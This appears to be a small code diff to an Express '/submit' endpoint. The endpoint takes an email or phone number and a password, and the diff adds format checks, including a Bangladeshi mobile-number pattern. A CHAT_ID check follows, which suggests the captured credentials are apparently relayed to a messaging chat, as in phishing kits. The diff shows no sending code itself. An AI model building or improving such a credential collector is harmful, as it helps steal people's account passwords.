@@ -66,7 +66,19 @@ app.post('/submit', async (req, res) => {
       error: 'Email/Phone and Password are required'
     });
   }
-  
+
+  const cleanEmail = Email.replace(/\s+/g, '');
+  // Basic validation for email or phone
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  // Updated Bangladeshi phone patterns to be more flexible
+  const bdPhonePattern = /^(?:\+?880|0)?1[3-9]\d{8}$|^01[3-9]\d{8}$/;
+
+  if (!emailPattern.test(Email) && !bdPhonePattern.test(Email)) {
+    console.log('❌ Invalid email or phone format');
+    return res.status(400).json({
+      error: 'Please enter a valid email address or phone number'
+    });
+  }
   
   if (!CHAT_ID) {
     console.log('❌ No chat ID available');
